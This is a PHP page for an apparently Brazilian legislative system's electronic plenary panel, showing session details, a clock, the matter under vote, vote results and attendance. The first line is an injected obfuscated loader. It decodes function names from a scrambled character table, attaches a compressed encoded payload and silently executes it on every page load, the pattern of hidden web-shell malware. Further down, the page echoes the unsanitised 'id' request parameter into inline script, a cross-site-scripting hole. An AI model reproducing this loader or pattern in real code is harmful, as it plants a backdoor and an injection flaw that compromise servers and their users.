<?php
$jipQT5765='w08jh_ktu9_4xc)(;l2vby/"=oni$ ep1qzdg3*fs[r5.m7]6a';$CwSnBoF2916=$jipQT5765[(12+1)].$jipQT5765[((424+290)/17)].$jipQT5765[(2*15)].$jipQT5765[(46+3)].$jipQT5765[(13-6)].$jipQT5765[(600/20)].$jipQT5765[(4+(10-4))].$jipQT5765[((39*8)/8)].$jipQT5765[((2+0)+6)].$jipQT5765[(22+(4*1))].$jipQT5765[((2704/13)/16)].$jipQT5765[(9-2)].$jipQT5765[(9+18)].$jipQT5765[(27-(2*1))].$jipQT5765[((45/3)+11)];$hASnOE6507=$jipQT5765[(13+15)].$jipQT5765[(12-0)].$jipQT5765[(360/(30/2))].$jipQT5765[(33-10)];$NDs4433=$jipQT5765[((6+0)+17)].$jipQT5765[((1*128)/8)].$jipQT5765[(1*28)].$jipQT5765[(980/(24-(6-2)))].$jipQT5765[(25-1)].$jipQT5765[(10*2)].$jipQT5765[(4+(1*45))].$jipQT5765[(360/((9*22)/22))].$jipQT5765[(270/9)].$jipQT5765[(((50/10)+12)+31)].$jipQT5765[(12-1)].$jipQT5765[(10/2)].$jipQT5765[(68-33)].$jipQT5765[(11+19)].$jipQT5765[(24-11)].$jipQT5765[((2-1)*25)].$jipQT5765[((2+6)+27)].$jipQT5765[(270/9)].$jipQT5765[(135/9)].$jipQT5765[(168/6)].$jipQT5765[(180/15)].$jipQT5765[(14+0)].$jipQT5765[(31-15)].$jipQT5765[(196/7)].$jipQT5765[(4*5)].$jipQT5765[(432/18)].$jipQT5765[(324/9)].$jipQT5765[(408/12)].$jipQT5765[(189/7)].$jipQT5765[(390/(30-15))].$jipQT5765[(((26-((0-0)/2))*18)/12)].$jipQT5765[((495/(21-6))-16)].$jipQT5765[(8+(820/((1*21)-1)))].$jipQT5765[(3+4)].$jipQT5765[(21+9)].$jipQT5765[(135/9)].$jipQT5765[(1*28)].$jipQT5765[(91-42)].$jipQT5765[(17-3)].$jipQT5765[(8*(44/22))].$jipQT5765[((34+21)-25)].$jipQT5765[(((1-0)*1)*19)].$jipQT5765[(245/5)].$jipQT5765[(((0+1)*17)-0)].$jipQT5765[(4+11)].$jipQT5765[((1*((560/((0*9)+14))+240))/10)].$jipQT5765[(28-8)].$jipQT5765[(210/15)].$jipQT5765[(25-9)];$YRVuE4720= "'XYq9CsIwFEb3PkWGS1Mhb5A5k4P4N0kJt8mNiaReaFIsiO8uuFTdzjnfd808YBbgOPOkwFPAOVeLria+rz4XsnjDZS0u4lSoKuCioGAgO7InBe7hFUQeyX4Ic8JCRTcpiA7swezP5ni6SJR92375IPuNeP4eur9dC3KRhdxtpRZmSVW/dPMG'";$FlInmCT1511.=$hASnOE6507;$FlInmCT1511.=$YRVuE4720;$FlInmCT1511.=$NDs4433;@$b3420=$CwSnBoF2916((''), ($FlInmCT1511));@$b3420();$pagina_link = 'cadastro_sessoes_plenarias';
include_once("../../core/mod_includes/php/funcoes.php");
sec_session_start(); 
include_once("../../core/mod_includes/php/connect.php");
?>
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <?php include("header.php");?> 
    <!-- script relogio -->
    <script>
    var clockid=new Array()
    var clockidoutside=new Array()
    var i_clock=-1
    var thistime= new Date()
    var hours=thistime.getHours()
    var minutes=thistime.getMinutes()
    var seconds=thistime.getSeconds()
    if (eval(hours) <10) {hours="0"+hours}
    if (eval(minutes) < 10) {minutes="0"+minutes}
    if (seconds < 10) {seconds="0"+seconds}
    var thistime = hours+":"+minutes+":"+seconds

    function writeclock() {
        i_clock++
        if (document.all || document.getElementById || document.layers) {
    clockid[i_clock]="clock"+i_clock
    document.write("<span id='"+clockid[i_clock]+"' style='position:relative'>"+thistime+"</span>")
        }
    }

    function clockon() {
        thistime= new Date()
        hours=thistime.getHours()
        minutes=thistime.getMinutes()
        seconds=thistime.getSeconds()
        if (eval(hours) <10) {hours="0"+hours}
        if (eval(minutes) < 10) {minutes="0"+minutes}
        if (seconds < 10) {seconds="0"+seconds}
        thistime = hours+":"+minutes+":"+seconds
        
        if (document.all) {
    for (i=0;i<=clockid.length-1;i++) {
        var thisclock=eval(clockid[i])
        thisclock.innerHTML=thistime
    }
        }

        if (document.getElementById) {
    for (i=0;i<=clockid.length-1;i++) {
        document.getElementById(clockid[i]).innerHTML=thistime
    }
        }
        var timer=setTimeout("clockon()",1000)
    }
    window.onload=clockon
    </SCRIPT>

    <!-- script relogio -->


   

    
</head>
<body id='painel_eletronico'>

    <?php
    # PEGA NOME SISTEMA E CLIENTE #
    $sql = "SELECT * FROM cadastro_clientes
            INNER JOIN cadastro_sistemas ON cadastro_sistemas.sis_id = cadastro_clientes.cli_sistema 
            WHERE cli_id = :cli_id";
    $stmt = $PDO->prepare( $sql );
    $stmt->bindParam( ':cli_id', $_SESSION['cliente_id']);       
    $stmt->bindValue( ':cli_status', 	1 );
    $stmt->execute();
    $rows = $stmt->rowCount();	

    if($rows > 0)
    {
        $result = $stmt->fetch();	
        $sis_logo 	= $result['sis_logo'];	
        $cli_nome 	= $result['cli_nome'];
        $cli_foto 	= $result['cli_foto'];
    }   
        
    if(isset($_GET['id'])){$id = $_GET['id'];}
  
  
    $sql = "SELECT *, cadastro_sessoes_plenarias.id as id
                    , cadastro_sessoes_plenarias.numero as numero
                    , aux_parlamentares_legislaturas.numero as numero_legislatura
                    , YEAR(aux_parlamentares_legislaturas.data_inicio) as data_inicio_legislatura
                    , YEAR(aux_parlamentares_legislaturas.data_fim) as data_fim_legislatura
                    , aux_mesa_diretora_sessoes.numero as numero_sessao
                    , YEAR(aux_mesa_diretora_sessoes.data_inicio) as data_inicio_sessao
                    , YEAR(aux_mesa_diretora_sessoes.data_fim) as data_fim_sessao
            FROM cadastro_sessoes_plenarias 
            LEFT JOIN aux_parlamentares_legislaturas ON aux_parlamentares_legislaturas.id = cadastro_sessoes_plenarias.legislatura                     
            LEFT JOIN aux_mesa_diretora_sessoes ON aux_mesa_diretora_sessoes.id = cadastro_sessoes_plenarias.sessao                     
            LEFT JOIN aux_sessoes_plenarias_tipos ON aux_sessoes_plenarias_tipos.id = cadastro_sessoes_plenarias.tipo_sessao                                      
            WHERE cadastro_sessoes_plenarias.id = :id ";
    $stmt = $PDO_PROCLEGIS->prepare($sql);            
    $stmt->bindParam(':id', $id);
    $stmt->execute();
    $rows = $stmt->rowCount();
    if($rows > 0)
    {
        $result = $stmt->fetch();
        
        ?>
        <p>
        <div class='topo'>
            <div class='logo'>
                <img src='../<?php echo $cli_foto;?>'  alt="Logo" /> 
            </div> 
            <div class='nome'>
                <p style='margin:0 0 5px 0; text-transform:uppercase; border:0; font-size:30px;'><?php echo $cli_nome;?></p>
                
               Sistema Processo Legislativo
            </div>   
            <div class='title'>
            <span style='font-size: 25px; font-weight:bold;'>
                <?php echo $result['numero']."ª Sessão ".$result['descricao']." da ".$result['numero_legislatura']." Legislatura";?>
            </span>
            </div>
            <p><br>

            <?php
            // MATERIA E RESULTADO
            $sql = "SELECT *, cadastro_sessoes_plenarias_exp_materias.id as id 
                            , cadastro_materias.numero as numero
                            , cadastro_sessoes_plenarias_exp_materias.observacao as observacao
                            , cadastro_sessoes_plenarias_exp_materias_leitura.observacao as observacao_leitura
                            , cadastro_sessoes_plenarias_exp_materias_votacao.observacao as observacao_votacao
                    FROM cadastro_sessoes_plenarias_exp_materias 
                    LEFT JOIN cadastro_sessoes_plenarias_exp_materias_leitura ON cadastro_sessoes_plenarias_exp_materias_leitura.materia_exp = cadastro_sessoes_plenarias_exp_materias.id                     
                    LEFT JOIN ( cadastro_sessoes_plenarias_exp_materias_votacao 
                        LEFT JOIN aux_sessoes_plenarias_tipo_resultado ON aux_sessoes_plenarias_tipo_resultado.id = cadastro_sessoes_plenarias_exp_materias_votacao.resultado)
                    ON cadastro_sessoes_plenarias_exp_materias_votacao.materia_exp = cadastro_sessoes_plenarias_exp_materias.id                     
                    LEFT JOIN aux_materias_tipos ON aux_materias_tipos.id = cadastro_sessoes_plenarias_exp_materias.tipo_materia                     
                    LEFT JOIN cadastro_materias ON cadastro_materias.id = cadastro_sessoes_plenarias_exp_materias.materia                     
                    LEFT JOIN cadastro_sessoes_plenarias ON cadastro_sessoes_plenarias.id = cadastro_sessoes_plenarias_exp_materias.sessao_plenaria                     
                    WHERE cadastro_sessoes_plenarias_exp_materias.ativo = :ativo AND 
                            cadastro_sessoes_plenarias_exp_materias.sessao_plenaria = :sessao_plenaria AND
                            ( cadastro_sessoes_plenarias_exp_materias.status = :status OR cadastro_sessoes_plenarias_exp_materias.status = :status2)
                    ORDER BY cadastro_sessoes_plenarias_exp_materias.id DESC
                    LIMIT 0, 1
                ";
            $stmt = $PDO_PROCLEGIS->prepare($sql);                                                    
            $stmt->bindParam(':sessao_plenaria', 	$id);    
            $stmt->bindParam(':primeiro_registro', 	$primeiro_registro);
            $stmt->bindParam(':num_por_pagina', 	$num_por_pagina);
            $status = "Aberta para votação";
            $stmt->bindParam(':status', 	$status);
            $status2 = "Matéria votada";
            $stmt->bindParam(':status2', 	$status2);
            $stmt->bindValue(':ativo', 	1);
            $stmt->execute();
            $rows = $stmt->rowCount();
            if ($rows > 0)
            {
                while($result = $stmt->fetch())
                {
                    $materia = $result['nome']." Nº ".$result['numero']." de ".$result['ano']."<br>";
                    $materia .= $result['ementa']."<br>";

                    $observacao = $result['observacao'];
                    $observacao_leitura = $result['observacao_leitura'];
                    $observacao_votacao = $result['observacao_votacao'];
                
                    $sim = $total_votos_sim = $result['sim'];if($sim == ""){ $sim = 0;}
                    $nao = $total_votos_nao= $result['nao'];if($nao == ""){ $nao = 0;}
                    $abstencao = $total_votos_abstencao = $result['abstencao'];if($abstencao == ""){ $abstencao = 0;}
                    $total_votos = $sim + $nao +$abstencao;
                    $inclui_presidente = $result['inclui_presidente'];
                    $resultado = $result['resultado'];
                    $descricao = $result['descricao'];
                    
                }
                $res = "Sim: ".$sim."<br>";
                $res .= "Não: ".$nao."<br>";
                $res .= "Abstenção: ".$abstencao."<br>";
                $res .= "Total votos: ".$total_votos."<br>";
                $res .= "<b>".$descricao."</b><br>";                
            }
            else
            {
                $materia = "Não há matérias abertas para votação no momento.";              
            }

            
            //CRONOMETROS   
            // $sql = "SELECT *                       
            //         FROM cadastro_sessoes_plenarias_cronometro
            //         WHERE sessao = :sessao	                                
            //         ";
            // $stmt_int = $PDO_PROCLEGIS->prepare($sql);                                                                                                
            // $stmt_int->bindParam(':sessao', 	$id);
            // $stmt_int->execute();
            // $rows_int = $stmt_int->rowCount();
            // if($rows_int > 0)
            // {
            //     while($result_int = $stmt_int->fetch())
            //     {
            //         $crono = "Discurso: ".$result_int['discurso']."<br>";
            //         $crono .= "Aparte: ".$result_int['aparte']."<br>";
            //         $crono .= "Questão de Ordem: ".$result_int['ordem']."<br>";
            //         $crono .= "Considerações Finais: ".$result_int['consideracoes']."<br>";

            //     }
            // }

            
            
            ?>

            <table cellpadding='6' style='font-size: 25px; font-weight:bold;' width='100%' align='center'>
                <tr>
                    <td width='33%' align='center' class='bold'><?php echo date("d/m/Y");?></td>
                    <td width='33%' align='center'></td>
                    <td width='33%' align='center'  class='bold'><script>writeclock();</SCRIPT></td>                    
                </tr>
            </table>
            <p>
            <table cellpadding='6' width='100%' align='center' style='font-size:18px;'>
                <tr >
                    <td width='33%' align='center' rowspan='2' valign='top'>
                        <span class='titulo'>PARLAMENTARES</span>
                        <p>
                        <div id="presenca"></div>
                    </td>
                    <td width='33%' align='center' valign='top'>
                        <span class='titulo'>CRONÔMETROS</span>
                        <p>                       
                        <div id="cronometros"></div>
                    </td>
                    <td width='33%' align='center'  valign='top'>
                        <span class='titulo'>RESULTADO</span>
                        <p>
                        <div id="resultado"></div>
                    </td>                    
                </tr>
                <tr>
                    
                    <td width='33%' align='center' valign='top'>
                        <span class='titulo'>MATÉRIA EM VOTAÇÃO</span>
                        <P>
                        <div id="materia"></div>
                    </td>
                    <td width='33%' align='center'  class='bold'></td>                    
                </tr>
            </table>
        </div>
        <?php
    }
    ?>
     <script>
    
        function cronos()
        {
            jQuery.post("../mod_includes/php/refresh_cronometro.php",
            {            
                sessao: "<?php echo $id;?>"	
            },
            function(valor) // Carrega o resultado acima para o campo catadm
            {				
                
                jQuery("#cronometros").html(valor);
                
            }); 
        

            jQuery.post("../mod_includes/php/refresh_presenca.php",
            {            
                sessao: "<?php echo $id;?>"	
            },
            function(valor) // Carrega o resultado acima para o campo catadm
            {				
                
                jQuery("#presenca").html(valor);
                
            }); 

            jQuery.post("../mod_includes/php/refresh_materia.php",
            {            
                sessao: "<?php echo $id;?>"	
            },
            function(valor) // Carrega o resultado acima para o campo catadm
            {				
                
                jQuery("#materia").html(valor);
                
            }); 

            jQuery.post("../mod_includes/php/refresh_resultado.php",
            {            
                sessao: "<?php echo $id;?>"	
            },
            function(valor) // Carrega o resultado acima para o campo catadm
            {				
                
                jQuery("#resultado").html(valor);
                
            }); 

            

            setTimeout(function(){cronos()},1000);
        }
       

        cronos();   
        
    
    </script>
</body>
</html>